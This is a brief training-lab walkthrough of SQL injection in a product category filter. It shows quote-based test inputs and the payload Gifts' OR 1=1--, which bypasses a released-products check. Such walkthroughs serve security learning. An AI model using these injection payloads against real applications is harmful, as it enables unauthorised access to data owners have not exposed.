# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Goal:
`Cause the application to display one or more unreleased products`

### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The backend query is:
`SELECT * FROM products WHERE category = '<input>' AND released = 1`
<br><br><br>

**<ins>Step 1: Test injection point</ins>**

category=Gifts'

`500: server error`<br><br>

category=Gifts'--

`200`

This indicates the existence of an SQL misconfiguration.
<br><br>

**<ins>Step 2: Exploit the vulnerability</ins>**

category=Gifts' OR 1=1--

`Success!`<br><br>

This request sends the server this query:

`category=Gifts' OR 1=1`

This will show us all products where the category is Gifts OR where 1=1. 1=1 is always true, so we will see all products in the database.